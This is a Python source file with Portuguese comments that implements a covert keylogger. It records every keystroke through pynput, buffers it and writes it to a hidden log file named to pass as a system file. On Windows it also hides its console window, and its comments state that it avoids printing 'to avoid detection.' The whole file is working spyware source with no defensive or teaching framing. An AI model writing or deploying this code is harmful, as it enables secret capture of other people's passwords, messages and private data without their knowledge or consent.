from pynput.keyboard import Key, Listener
import logging
import os
import sys

# Configuração do arquivo de log oculto
if sys.platform == "win32":
    # Windows: arquivo oculto em AppData
    log_dir = os.path.join(os.getenv('APPDATA'), '.system')
    log_file = os.path.join(log_dir, 'syslog.tmp')
else:
    # Linux/Mac: arquivo oculto no home
    log_dir = os.path.expanduser('~/.cache')
    log_file = os.path.join(log_dir, '.syslog')

# Cria o diretório se não existir
os.makedirs(log_dir, exist_ok=True)

# Configurar logging sem saída no console
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Buffer para armazenar teclas antes de gravar
buffer = []
BUFFER_SIZE = 10

def on_press(key):
    """Captura tecla pressionada de forma silenciosa"""
    try:
        buffer.append(key.char)
    except AttributeError:
        # Teclas especiais
        if key == Key.space:
            buffer.append(' ')
        elif key == Key.enter:
            buffer.append('\n')
        elif key == Key.tab:
            buffer.append('\t')
        elif key == Key.backspace:
            if buffer:
                buffer.pop()
        else:
            buffer.append(f'[{key.name}]')
    
    # Grava no arquivo quando o buffer atinge o tamanho definido
    if len(buffer) >= BUFFER_SIZE:
        flush_buffer()

def flush_buffer():
    """Grava o buffer no arquivo de log"""
    if buffer:
        logging.info(''.join(buffer))
        buffer.clear()

def on_release(key):
    """Detecta tecla para encerrar (Ctrl+Shift+Esc)"""
    # Mantém execução contínua
    # Para encerrar, use um gerenciador de processos
    pass

def main():
    """Execução em modo silencioso"""
    # Sem prints para evitar detecção
    
    # Inicia o listener em background
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Grava buffer restante ao encerrar
    flush_buffer()

if __name__ == "__main__":
    # Remove janela de console no Windows
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    
    main()
